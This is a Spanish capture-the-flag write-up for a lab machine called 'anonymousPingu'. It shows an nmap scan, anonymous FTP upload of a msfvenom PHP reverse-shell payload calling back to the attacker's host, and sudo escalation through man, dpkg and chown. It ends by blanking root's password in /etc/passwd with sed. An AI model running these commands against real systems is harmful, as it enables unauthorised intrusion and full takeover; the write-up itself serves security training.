# anonymousPingu

* Máquina **atacante** -> 172.17.0.1
* Máquina **objetivo** -> 172.17.0.2 | Linux :penguin:

### Escaneo de puertos

Realizamos un escaneo de puertos con *nmap* para ver puertos abiertos de la máquina **objetivo**:
```shell
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```
![escaneo](/Capturas/2024-11-02_23-40.png)

Encontramos abiertos el puerto **21** y el **80**.

### FTP

Si nos fijamos en el reporte que nos da *nmap*, vemos que tenemos operativa la vulnerabilidad **anonymous**, con la que podemos entrar al servidor **ftp** sin necesidad de credenciales, el cual parece estar conectado con la página web que corre por el puerto **80**. También observamos que en uno de los directorios, tenemos permisos de lectura, escritura y ejecución, el cual se llama **upload**:

![upload](/Capturas/2024-11-02_23-46.png)

Por lo que ahora, crearemos un **payload** y lo guardaremos con extensión **.php**:
```shell
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > payload.php
```
A continuación, subimos el archivo al servidor **ftp**:

![subir_payload](/Capturas/2024-11-07_20-01.png)

Una vez subido, nos ponemos a la escucha con *netcat* por un puerto libre que tengamos:
```shell
nc -nlvp 443
```
Y ahora, nos vamos al navegador y accedemos al puerto 80 de la máquina **objetivo** dentro del directorio `/upload` para comprobar que el archivo se encuentra en la ruta que esperamos:

![upload](/Capturas/2024-11-07_20-03.png)

Hacemos doble click en el archivo creado, y si nos vamos a donde estábamos a la escucha con *netcat*, veremos que ya habremos hecho la **intrusión**:

![intrusion](/Capturas/2024-11-07_20-05.png)

> Es aconsejable estabilizar la conexión creando otra por otro puerto diferente, para que no se nos caiga cada poco tiempo, ya que **msfvenom** crea una conexión inestable.

### Escalada de privilegios

Si ejecutamos el comando `sudo -l`, podemos ver que estamos habilitados para ejecutar *man* como el usuario **pingu**:

![man](/Capturas/2024-11-07_20-16.png)

Por lo que simplemente ejecutamos los siguientes comandos y...
```shell
sudo -u pingu /usr/bin/man man
```
```shell
!/bin/sh
```
somos el usuario **pingu**:

![pingu](/Capturas/2024-11-07_21-05.png)

Realizamos la misma operación que con **www-data** y vemos que podemos ejecutar *nmap* y *dpkg* como el usuario **gladys**:

![sudo-l](/Capturas/2024-11-07_21-06.png)

Escalamos al usuario **gladys** con *dpkg* usandos los siguientes comandos:
```shell
sudo -u gladys dpkg -l
```
```shell
!/bin/sh
```
Ahora somos el usuario **gladys**:

![gladys](/Capturas/2024-11-07_21-13.png)

Volvemos a realizar la misma operación por última vez y observamos que podemos ejecutar *chown* como **root**:

![chown](/Capturas/2024-11-07_21-15.png)

Para escalar a **root** debemos primero cambiar los permisos del directorio `/etc`:
```shell
sudo /usr/bin/chown gladys:gladys /etc
```
Y comprobamos que se han cambiado los permisos del archivo que necesitamos `/etc/passwd`:

![comprobar](/Capturas/2024-11-07_22-46.png)

Ahora, cambiamos del archivo `/etc/passwd`, la **:x:** del usuario **root** para poder acceder a él sin autenticación. En este caso, debemos realizarlo con *sed*, ya que no tenemos ni *nano* ni *vim* ni *vi*:
```shell
/usr/bin/sed -i 's/root:x:/root::/g' /etc/passwd
```
Y ahora ya sólo tenemos que iniciar sesión como usuario **root**:

![root](/Capturas/2024-11-07_22-50.png)

:triangular_flag_on_post: